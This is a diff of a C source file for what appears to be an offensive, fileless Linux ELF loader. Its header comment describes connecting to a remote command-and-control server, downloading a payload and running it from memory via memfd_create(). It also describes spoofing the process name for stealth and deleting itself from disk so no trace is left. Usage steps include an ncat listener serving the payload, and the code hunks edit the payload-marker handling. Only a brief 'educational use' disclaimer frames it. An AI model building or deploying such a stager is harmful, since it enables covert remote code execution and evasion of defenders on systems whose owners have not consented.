@@ -4,38 +4,29 @@
  * ---------------------------------------------------------------------------
  *  Summary:
  *  This tool implements a fileless, in-memory ELF loader for Linux systems.
- *  It optionally decrypts a payload embedded in a carrier file or downloads 
- *  one from a remote C2 (Command & Control) server over TCP, and executes it 
- *  entirely from memory using memfd_create().
+ *  It connects to a remote C2 (Command & Control) server over TCP, downloads
+ *  a raw ELF payload, and executes it entirely from memory using memfd_create().
  *
  *  Key Features:
  *  - Uses memfd_create() to create a memory-backed, executable file descriptor
- *  - Executes an ELF binary directly from memory via /proc/self/fd/<fd>
- *  - Optionally pulls the payload from a configurable C2 IP and port
- *  - Applies a fake process name (argv[0]) for stealth in ps, top, etc.
- *  - Optionally links the process to a custom name in /proc/<pid>/status
+ *  - Pulls payload from a configurable C2 IP and port over a socket connection
+ *  - Executes the ELF binary directly from memory via /proc/self/fd/<fd>
+ *  - Applies a fake process name (argv[0]) for stealth in `ps`, `top`, etc.
  *  - Deletes itself from disk (via unlink("/proc/self/exe")) after execution
  *  - Leaves no payload or loader trace on the filesystem after startup
- *  - Optionally decrypts an embedded payload using AES-CBC with a configurable marker
- *  - Skips re-download if a local persisted (EXTRACT_PATH) copy exists
  *
  *  Typical Use:
  *    1. Compile the loader:
- *         $  gcc -o loader loader.c -lcrypto
+ *         $  gcc -o loader loader.c
  *    2. Start a listener to serve the payload binary:
- *         $  ncat -lvnp 1111 < payload.elf
- *    3. Execute the loader (loads from image or C2):
- *         $  ./loader
- *
- *  Optional Behavior:
- *    - If EXTRACT_PATH is defined and exists, use it as a payload cache.
- *    - If the marker is detected in the payload, AES decryption is applied.
+ *         $ ncat -lvnp 1111 < payload.elf
+ *    3. Execute the loader:
+ *         $ ./loader
  *
  *  Warning:
- *  This code is for educational and authorized use only. Do not use on 
+ *  This code is for for educational and authorized use only. Do not use on 
  *  systems you do not own or have explicit permission to operate on.
  */
-
 
 #define _GNU_SOURCE
 #include <stdio.h>
@@ -95,7 +86,9 @@ unsigned char *process_payload(FILE *f, size_t *out_size, int *payload_len) {
     fclose(f);
 
     // Check for marker
-    char *marker = memmem(raw, *out_size, MARKER, strlen(MARKER));
+    char *marker = NULL;
+    if (MARKER && strlen(MARKER) > 0)
+        marker = memmem(raw, *out_size, MARKER, strlen(MARKER));
     unsigned char *payload = NULL;
 
     if (marker) {
@@ -233,4 +226,3 @@ int main(int argc, char **argv) {
     }
     return 0;
 }
-
